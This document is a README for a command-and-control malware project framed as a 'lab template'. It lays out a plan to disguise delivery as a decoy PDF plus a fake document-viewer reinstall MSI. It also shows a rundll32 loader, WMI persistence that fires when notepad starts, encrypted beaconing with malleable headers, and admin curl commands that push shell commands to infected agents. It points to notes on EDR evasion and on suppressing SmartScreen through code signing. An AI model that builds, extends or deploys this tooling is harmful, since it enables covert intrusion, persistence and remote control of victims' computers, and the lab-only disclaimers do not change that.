# C2 Infrastructure — DocViewer Lab Template

> **Current lab build:** v1.4.4-lab-always-cmd — shell/exec always-on; `shell_admin`/`exec_admin`/`priv`; stream gate unchanged. See `docs/always-cmd-elevated.md`.

통제된 랩/교육용 플레이스홀더 템플릿.  
**배포 위장 확정안**: 미끼 PDF + 위장 MSI (`문서 뷰어 재설치`).

> 운영 도메인·토큰·인증서를 랩 기본값 그대로 쓰지 말 것.  
> **v1.4.1**: v1.4 comms + **loader EntryPoint export** + Windows smoke / WMI / MSI harness.

## 테스트 환경 원칙

모든 빌드·스모크·WMI·MSI 검증은 Kali lab, Windows lab VM, loopback 또는 그에 준하는 **격리된 테스트 환경**에서만 수행한다. 운영 호스트, 실제 사용자 장비, 실제 자격 증명과 운영 데이터를 테스트 대상으로 사용하지 않는다. 테스트 전 대상 호스트와 네트워크 범위를 확인하고, 테스트 후 생성된 프로세스·서비스·파일·토큰을 정리한다.

이 소스코드는 토렌트 배포 또는 공개 유포를 위한 것이 아니다. 소유자 또는 관리자의 승인을 받은 환경에서만 실행하며, 승인되지 않은 제3자 시스템이나 장비를 대상으로 사용하지 않는다.

## Architecture

```
리더기_재설치_안내.pdf  +  DocViewer_Setup.msi
                              │
                              ▼
              Loader DLL (EntryPoint) / EXE → Agent
                              │
                              ▼
                    WMI (optional re-trigger)
                              │
          ┌───────────────────┴───────────────────┐
          ▼                                       ▼
   WSS (AGENT_WS_PATH)                 HTTPS POST (BEACON_URIS)
          └───────────────────┬───────────────────┘
                              ▼
                     C2 Server (ADMIN_TOKEN)
                     data/state.json + data/files/
```

## Quick start (Linux lab)

```bash
source config.lab.env
./build/build.sh all

export TLS_CERT_PATH=./certs/server.crt TLS_KEY_PATH=./certs/server.key
./bin/c2server

# WSS agent
C2_TRANSPORT=wss C2_SERVER=wss://127.0.0.1:8443/socket/v1 \
  C2_AUTH_TOKEN="$AGENT_TOKEN" C2_PSK="$C2_PSK" C2_CRYPTO=1 \
  C2_INTERVAL=5 ./bin/agent_linux
```

### Admin examples

```bash
curl -sk -H "X-Auth-Token: $ADMIN_TOKEN" https://127.0.0.1:8443/admin/agents
curl -sk -X POST -H "X-Auth-Token: $ADMIN_TOKEN" -H 'Content-Type: application/json' \
  -d '{"agent_id":"agent-...","cmd_type":"shell","payload":"uname -a"}' \
  https://127.0.0.1:8443/admin/cmd
```

## Feature matrix

| ID | Feature | Status |
|----|---------|--------|
| B-H1–H5 | queue / stable id / kill / profile / tokens | ✅ |
| I-1–I-4 | shell/exec / cancel / state.json / protocol | ✅ |
| **U/D** | upload/download + admin file APIs | ✅ |
| **B-H6** | HTTP beacon | ✅ |
| **B-H7** | URI/UA/headers malleable | ✅ |
| **B-H8** | AEAD (AES-256-GCM) | ✅ |
| **Loader EntryPoint** | rundll32 export for WMI/MSI | ✅ v1.4.1 |
| Loader PE reloc/IAT | incomplete stubs | ⬜ |
| Windows live smoke | harness ready, VM pending | ⬜ harness ✅ / live ⬜ |

## Windows — 다음에 하면 되는 것

**상세 원샷**: [`docs/VM_NEXT.md`](docs/VM_NEXT.md)

```powershell
$env:C2_HOST     = "<kali-ip>"
$env:ADMIN_TOKEN = "lab-admin-token-change-me"
$env:AGENT_TOKEN = "lab-agent-token-change-me"
$env:C2_PSK      = "lab-psk-change-me"    # config.lab.env 정본
.\scripts\smoke_windows.ps1              # 1) 통신+가벼운 WMI
# 통과 후
.\scripts\wmi_live_test.ps1              # 2) 영속 live → agent online
.\scripts\msi_install_lab.ps1 -Install   # 3) WiX MSI (Windows+WiX)
```

결과 파일: `data/smoke_windows_last.md`, `data/wmi_live_last.md` → `SMOKE_windows.md` 표에 반영.

> 위 절차는 격리된 Windows lab VM에서만 실행한다. 운영 환경이나 허가받지 않은 호스트로 `C2_HOST`를 지정하지 않는다.

EDR 탐지 서피스/우회 검토: [`docs/edr-detection-surface.md`](docs/edr-detection-surface.md)

코드 서명으로 SmartScreen 파란 화면 억제 실측: [`docs/msi-codesign-smartscreen.md`](docs/msi-codesign-smartscreen.md)

### Binaries (built on Kali)

| Path | Role |
|------|------|
| `bin/agent.exe` | Windows agent (cmd /C shell) |
| `bin/loader.exe` | CLI loader harness |
| `bin/loader.dll` | **exports `EntryPoint`, `Start`** — WMI/MSI target |
| `bin/persistence/wmi_*.ps1` | WMI install/status/uninstall |
| `deploy/msi_stage/` | `DocViewerCore.dll` + `DocViewerHelper.exe` + `DocViewer.wxs` |

```bash
python3 scripts/verify_loader_exports.py bin/loader.dll
```

### WMI contract

```
Payload:  C:\ProgramData\DocViewer\DocViewerCore.dll   (loader.dll)
Sibling:  C:\ProgramData\DocViewer\DocViewerHelper.exe (agent.exe)
Trigger:  notepad.exe start → rundll32.exe "<dll>",EntryPoint
```

### MSI

- Kali: stage only (`deploy/msi_stage`)
- Windows + WiX: `scripts/msi_install_lab.ps1` / `msi/package.ps1`
- CustomAction: `rundll32.exe [#LoaderDLL],EntryPoint`

## Layout

```
c2-project/
├── agent/ server/ loader/ persistence/ msi/ deploy/ build/ scripts/ docs/
├── profiles/   lab · http-beacon · malleable
├── data/       state.json · files/ · smoke_*_last.md
├── protocol.md SMOKE_v1.4.md SMOKE_windows.md docs/VM_NEXT.md
└── TODO.md
```

## License / intent

Proof-of-concept lab template. Not a turnkey offensive package.
